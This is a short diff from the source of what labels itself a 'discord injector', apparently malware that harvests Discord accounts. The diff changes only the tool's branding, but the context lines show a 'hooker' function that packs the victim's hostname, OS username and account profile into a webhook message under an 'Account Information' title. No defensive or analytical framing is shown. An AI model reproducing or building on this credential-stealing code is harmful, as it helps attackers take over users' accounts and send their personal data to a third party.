@@ -147,7 +147,7 @@ const request = async (method, url, headers, data) => {
 
 const hooker = async (content, token, account) => {
     content["content"] = "`" + os.hostname() + "` - `" + os.userInfo().username + "`\n\n" + content["content"];
-    content["username"] = "proxybit - discord injector";
+    content["username"] = "ProxyCord - discord injector";
     content["avatar_url"] = "https://i.ibb.co/GJGXzGX/discord-avatar-512-FCWUJ.png";
     content["embeds"][0]["author"] = {
         "name": account.username,
@@ -156,7 +156,7 @@ const hooker = async (content, token, account) => {
         "url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`
     };
     content["embeds"][0]["footer"] = {
-        "text": "ProxyBit injector - made by saeed0x1",
+        "text": "ProxyCord - made by saeed0x1",
         "icon_url": "https://avatars.githubusercontent.com/u/73954987?v=4",
     };
     content["embeds"][0]["title"] = "Account Information";
